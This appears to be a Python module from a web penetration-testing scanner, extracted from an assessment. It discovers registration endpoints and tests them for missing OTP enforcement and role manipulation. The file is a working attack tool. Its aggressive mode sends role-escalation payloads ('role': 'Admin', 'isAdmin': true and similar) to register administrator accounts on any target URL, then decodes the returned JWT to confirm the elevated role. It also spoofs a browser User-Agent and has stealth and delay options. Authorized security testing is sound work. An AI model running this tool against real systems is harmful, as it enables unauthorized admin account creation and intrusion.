"""
Registration Security Check — Discover and test registration endpoints for
insecure practices including missing OTP enforcement and role manipulation.

Extracted technique from Authorized assessment findings:
- POST /api/v1/Auth/register accepted 'Role=Admin' without validation
- No OTP/phone verification was required for registration
- Registration was fully open without authentication
"""

import re
import json
import requests


# Common registration endpoint patterns
REGISTER_PATHS = [
    "/api/v1/Auth/register",
    "/api/v1/auth/register",
    "/api/auth/register",
    "/api/v1/Auth/signup",
    "/api/auth/signup",
    "/api/v1/Auth/sign-up",
    "/api/auth/create",
    "/api/v1/users/register",
    "/api/users/register",
    "/api/v1/user/register",
    "/api/user",
    "/register",
    "/signup",
    "/api/v1/register",
    "/api/register",
    "/api/v1/account",
    "/api/account",
]

# Payloads for role manipulation testing
ROLE_PAYLOADS = [
    {"role": "Admin", "isAdmin": True, "is_admin": True},
    {"role": "admin", "isAdmin": True, "is_admin": True},
    {"role": "SuperAdmin", "isAdmin": True, "is_superuser": True},
    {"role": "administrator"},
]

# User roles to attempt (safe vs elevated)
SAFE_ROLES = ["User", "Client", "Member", "customer"]
ELEVATED_ROLES = ["Admin", "administrator", "SuperAdmin", "superadmin", "Manager", "owner"]


class RegistrationSecurityCheck:
    """Discover and analyze registration security vulnerabilities."""

    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        self.domain = target_url.split("//")[-1].split("/")[0]
        self.results = {}
        self.scan_mode = "safe"
        self.stealth = False
        self.request_delay = 0
        self._session = requests.Session()
        self._session.headers.update({
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/125.0.0.0 Safari/537.36",
        })

    def _get(self, url, **kwargs):
        if self.request_delay:
            import time
            time.sleep(self.request_delay)
        return self._session.get(url, timeout=10, **kwargs)

    def _post(self, url, **kwargs):
        if self.request_delay:
            import time
            time.sleep(self.request_delay)
        return self._session.post(url, timeout=10, **kwargs)

    def discover_register_endpoints(self):
        """Discover registration endpoints by probing common paths."""
        findings = []
        for path in REGISTER_PATHS:
            url = f"{self.target_url}{path}"
            try:
                r = self._get(url, allow_redirects=True)
                if r.status_code not in [404, 405, 400]:
                    findings.append({
                        "path": path,
                        "url": url,
                        "status": r.status_code,
                        "method": "GET",
                        "note": "Endpoint responded — potential registration endpoint",
                    })
                # Try OPTIONS to see allowed methods
                if r.status_code != 404:
                    r2 = self._session.options(url, timeout=8)
                    if r2.status_code == 200 and "allow" in r2.headers:
                        findings.append({
                            "path": path,
                            "url": url,
                            "status": r2.status_code,
                            "method": "OPTIONS",
                            "allowed": r2.headers.get("allow", ""),
                            "note": "OPTIONS returned allowed methods",
                        })
            except requests.RequestException:
                pass
        self.results["register_endpoints"] = findings
        return findings

    def test_safe_registration(self):
        """Test registration with safe/user-level role (no privilege escalation).
        Only fires POST in active/aggressive scan mode.
        """
        if self.scan_mode == "safe":
            self.results["safe_registration"] = {
                "skipped": True,
                "note": "Skipped in safe mode — would send POST with user-level role",
            }
            return self.results["safe_registration"]

        findings = []
        endpoints = [ep["path"] for ep in self.results.get("register_endpoints", [])]
        if not endpoints:
            endpoints = REGISTER_PATHS[:6]

        test_phone = f"+1555{self.domain[:4]}001"
        test_pass = "TestReg123!"

        for path in endpoints[:6]:
            url = f"{self.target_url}{path}"

            # Try JSON body
            for safe_role in SAFE_ROLES:
                payloads_to_try = [
                    {"phoneNumber": test_phone, "password": test_pass,
                     "fullName": "Test User", "role": safe_role},
                    {"phone": test_phone, "password": test_pass,
                     "name": "Test User", "role": safe_role},
                    {"email": f"test@{self.domain}", "password": test_pass,
                     "name": "Test User", "role": safe_role},
                ]
                for payload in payloads_to_try:
                    try:
                        r = self._post(url, json=payload)
                        resp_body = r.text[:500]
                        is_success = r.status_code in [200, 201, 202]
                        if is_success or "token" in resp_body.lower() or "jwt" in resp_body.lower():
                            findings.append({
                                "endpoint": path,
                                "format": "json",
                                "role_used": safe_role,
                                "status": r.status_code,
                                "success": is_success,
                                "got_token": "token" in resp_body.lower() or "jwt" in resp_body.lower(),
                                "response_preview": resp_body[:200],
                                "note": f"Registration succeeded with role={safe_role}",
                            })
                            break
                    except requests.RequestException:
                        pass
                if findings and findings[-1].get("success"):
                    break

            # If JSON didn't work, try form-data
            if not any(f.get("success") for f in findings):
                for safe_role in SAFE_ROLES[:2]:
                    try:
                        r = self._post(url, files={
                            "PhoneNumber": (None, test_phone),
                            "Password": (None, test_pass),
                            "FullName": (None, "Test User"),
                            "Role": (None, safe_role),
                        })
                        resp_body = r.text[:500]
                        is_success = r.status_code in [200, 201, 202]
                        if is_success or "token" in resp_body.lower():
                            findings.append({
                                "endpoint": path,
                                "format": "form-data",
                                "role_used": safe_role,
                                "status": r.status_code,
                                "success": is_success,
                                "got_token": "token" in resp_body.lower(),
                                "response_preview": resp_body[:200],
                                "note": f"Registration via form-data succeeded with role={safe_role}",
                            })
                            break
                    except requests.RequestException:
                        pass

        self.results["safe_registration"] = findings
        return findings

    def test_elevated_role_registration(self):
        """Test if registration accepts elevated roles (Admin, etc.).
        Only fires POST in active/aggressive mode.
        Warning: This is an active probe that may create accounts.
        """
        if self.scan_mode == "safe":
            self.results["elevated_role_registration"] = {
                "skipped": True,
                "note": "Skipped in safe mode — would attempt admin role registration",
            }
            return self.results["elevated_role_registration"]

        findings = []
        endpoints = [ep["path"] for ep in self.results.get("register_endpoints", [])]
        if not endpoints:
            endpoints = REGISTER_PATHS[:6]

        for path in endpoints[:4]:
            url = f"{self.target_url}{path}"
            test_phone = f"+1555{self.domain[:3]}adm"
            test_pass = "TestRole123!"

            # Test each elevated role
            for elevated_role in ELEVATED_ROLES:
                try:
                    r = self._post(url, json={
                        "phoneNumber": test_phone,
                        "password": test_pass,
                        "fullName": f"Test {elevated_role}",
                        "role": elevated_role,
                    })
                    resp_body = r.text[:500]
                    r_status = r.status_code

                    entry = {
                        "endpoint": path,
                        "role_attempted": elevated_role,
                        "status": r_status,
                    }

                    if r_status in [200, 201, 202]:
                        has_token = "token" in resp_body.lower() or "jwt" in resp_body.lower()
                        entry["vulnerable"] = has_token
                        entry["got_token"] = has_token
                        entry["response_preview"] = resp_body[:200]
                        if has_token:
                            # Try to decode JWT to confirm role
                            try:
                                import base64
                                token_match = re.search(
                                    r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
                                    resp_body
                                )
                                if token_match:
                                    payload_b64 = token_match.group().split(".")[1]
                                    payload_b64 += "=" * (4 - len(payload_b64) % 4)
                                    decoded = json.loads(base64.b64decode(payload_b64))
                                    jwt_role = decoded.get(
                                        "http://schemas.microsoft.com/ws/2008/06/identity/claims/role",
                                        decoded.get("role", "")
                                    )
                                    entry["jwt_role"] = jwt_role
                                    entry["phone_confirmed"] = decoded.get("phone_number_confirmed", "unknown")
                            except Exception:
                                pass

                        entry["note"] = f"Registration accepted role={elevated_role} — potential privilege escalation"
                    elif r_status == 403:
                        entry["vulnerable"] = False
                        entry["note"] = "Registration blocked (403) — elevated roles likely restricted"
                    else:
                        entry["vulnerable"] = False

                    findings.append(entry)
                    if entry.get("vulnerable"):
                        break  # Found a vuln, no need to test more on this endpoint

                except requests.RequestException:
                    pass

        self.results["elevated_role_registration"] = findings
        return findings

    def check_otp_requirement(self):
        """Analyze response patterns to determine if OTP verification is enforced.
        Checks for OTP-related fields in registration responses.
        """
        findings = []
        for reg_data in self.results.get("safe_registration", []):
            if isinstance(reg_data, dict) and reg_data.get("success") and reg_data.get("got_token"):
                preview = reg_data.get("response_preview", "")
                # Check if the token indicates phone not confirmed
                if "phone_number_confirmed" in preview or "phoneConfirmed" in preview:
                    if '"false"' in preview or '"phone_number_confirmed":false' in preview:
                        findings.append({
                            "endpoint": reg_data.get("endpoint", ""),
                            "otp_required": False,
                            "phone_confirmed": False,
                            "note": "Phone number NOT confirmed — OTP likely not enforced",
                        })

        self.results["otp_requirement"] = findings
        return findings

    def run_all(self):
        """Run all registration security checks respecting scan mode."""
        self.results = {
            "scan_mode": self.scan_mode,
            "stealth": self.stealth,
        }

        # Phase 1: Passive discovery (safe in all modes)
        self.discover_register_endpoints()

        # Phase 2: Active tests (gated by scan mode)
        if self.scan_mode != "safe":
            self.test_safe_registration()
            self.check_otp_requirement()
        else:
            self.results["safe_registration"] = {
                "skipped": True,
                "note": "Skipped in safe mode — use 'active' or 'aggressive' mode for POST probes",
            }
            self.results["elevated_role_registration"] = {
                "skipped": True,
                "note": "Skipped in safe mode — use 'active' or 'aggressive' mode for role escalation tests",
            }

        if self.scan_mode == "aggressive":
            self.test_elevated_role_registration()
        else:
            self.results["elevated_role_registration"] = {
                "skipped": True,
                "note": "Skipped — use 'aggressive' mode for admin role escalation tests",
            }

        return self.results
